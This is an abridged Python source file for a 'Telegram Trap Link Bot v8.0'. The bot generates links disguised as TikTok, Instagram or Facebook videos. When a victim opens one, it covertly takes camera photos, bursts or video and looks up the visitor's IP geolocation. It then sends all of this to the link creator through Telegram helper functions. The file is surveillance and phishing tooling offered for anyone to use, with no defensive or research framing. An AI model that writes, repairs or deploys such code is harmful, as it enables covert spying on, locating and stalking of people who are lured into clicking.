"""
Telegram Trap Link Bot v8.0 — FINAL FIXED
- ✅ Event loop fix — no more "Event loop is closed" error
- ✅ ANY Telegram user can use it (captures go to the link creator)
- ✅ Content types: Single Photo | Burst | Video | IP Location Only
- ✅ IP Location auto-included with ALL camera captures
- ✅ ImageCapture.grabFrame() for 100% reliable photo capture
- ✅ Works on Render.com + localhost
- ✅ ALL URL formats accepted (TikTok, Instagram, Facebook)
"""
...
generated_links = {}
_bot_app = None
_bot_loop = None  # Store the bot's event loop
...
def extract_video_info(text):
    """Accepts ALL real-world TikTok, Instagram, Facebook URL formats."""
    text = text.strip()
...
def get_ip_address():
    """Get the REAL visitor IP, handling Render's proxy headers."""
...
def get_geo_info(ip_address):
    """Get geolocation using freeipapi.com — HTTPS, 60 req/min, no API key."""
    try:
        ...
        try:
            ...
            if data2.get("status") == "success":
                return {
                    "ip": data2.get("query", ip_address), "country": data2.get("country", "Unknown"),
                    "city": data2.get("city", "Unknown"), "region": "",
                    "lat": data2.get("lat", 0), "lon": data2.get("lon", 0),
                    "isp": data2.get("isp", "Unknown"), "org": data2.get("org", ""),
                    "mobile": data2.get("mobile", False), "proxy": data2.get("proxy", False), "hosting": data2.get("hosting", False)
                }
        except:
            pass
        return {
...
# ============ TELEGRAM SEND HELPERS — FIXED EVENT LOOP ============

def send_photo_sync(chat_id, image_base64, caption=""):
    """Send photo using the bot's existing event loop."""
    global _bot_loop
    ...
    try:
        ...
        async def _send():
            try:
                await _bot_app.bot.send_photo(
                    chat_id=int(chat_id),
                    photo=InputFile(photo_file, filename="capture.jpg"),
        ...
        # Schedule on the bot's event loop
...
def send_video_sync(chat_id, video_base64, caption=""):
    """Send video using the bot's existing event loop."""
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        logger.error("Bot event loop not available")
        return False
        ...
        async def _send():
            try:
                await _bot_app.bot.send_video(
                    chat_id=int(chat_id),
                    video=InputFile(video_file, filename="capture.webm"),
                    caption=caption, parse_mode="Markdown",
...
def send_media_group_sync(chat_id, images_base64_list, caption=""):
    """Send media group using the bot's existing event loop."""
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        logger.error("Bot event loop not available")
        return False
    try:
        ...
        for i, img_b64 in enumerate(images_base64_list[:10]):
            ...
            media_group.append(InputMediaPhoto(
                media=InputFile(img_file, filename=f"burst_{i+1}.jpg")
            ))
...
def send_message_sync(chat_id, text, parse_mode="Markdown", disable_preview=True):
    """Send message using the bot's existing event loop."""
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        logger.error("Bot event loop not available")
        return False
...
async def generate_and_send_link(update, context, user_id, config):
    """Generate a trap link from message context."""
    ...
    msg = (
        f"✅ *Trap Link Generated!*\n\n"
        f"🔗 `{link_url}`\n\n"
        f"{emoji} *Content:* {CONTENT_TYPES[config['content_type']]}\n"
    )
    if needs_camera:
        msg += f"🎥 *Camera:* {CAMERA_TYPES[config['camera']]}\n"
    msg += f"🌐 *Platform:* {SOCIAL_NETWORKS[config['social_network']]}\n\n"
    msg += f"📍 *IP + Location:* Always included ✅\n"
    if needs_camera:
...
async def generate_and_send_link_callback(query, context, user_id, config):
    """Generate a trap link from callback query."""
    link_id = generate_link_id()
    base_url = RENDER_URL.rstrip("/") if RENDER_URL else f"http://localhost:{PORT}"
    link_url = f"{base_url}/l/{link_id}"
...
@app.route("/")
def index():
    return jsonify({"status": "running", "name": "Telegram Trap Link Bot v8.0", "mode": BOT_MODE, "links_active": len(generated_links)})
...
def set_webhook():
    if not RENDER_URL:
        return jsonify({"status": "error", "message": "RENDER_URL not set"}), 400
...
def run_bot():
    ...
    if BOT_MODE == "webhook" and RENDER_URL:
        wh = f"{RENDER_URL.rstrip('/')}/webhook/{BOT_TOKEN}"
        logger.info(f"Starting webhook mode on port {PORT}")
        _bot_app.run_webhook(
            listen="0.0.0.0", port=PORT,
            url_path=f"webhook/{BOT_TOKEN}",
            webhook_url=wh, secret_token=WEBHOOK_SECRET
        )
    else:
...
║   Telegram Trap Link Bot v8.0 — FINAL FIXED                  ║
║                                                              ║
║   ✅ Event loop FIXED — no more "Event loop is closed"       ║
║   ✅ ANY Telegram user can use it                             ║
║   ✅ Content types: Photo | Burst | Video | IP Only          ║
║   ✅ IP Location auto-included with ALL camera captures      ║
║   ✅ ImageCapture.grabFrame() — 100% reliable capture        ║
║   ✅ Works on Render.com + localhost                          ║
╚═══════════════════════════════════════════════════════════════╝
    """)
